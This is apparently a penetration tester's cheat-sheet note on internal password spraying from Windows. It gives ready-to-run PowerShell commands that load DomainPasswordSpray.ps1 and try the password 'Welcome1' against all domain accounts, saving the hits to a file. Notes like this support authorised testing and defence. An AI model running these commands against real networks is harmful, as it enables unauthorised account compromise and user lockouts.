Internal Password Spraying - from Windows

Using DomainPasswordSpray.ps1
```powershell
Import-Module .\DomainPasswordSpray.ps1
```
```powershell
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
























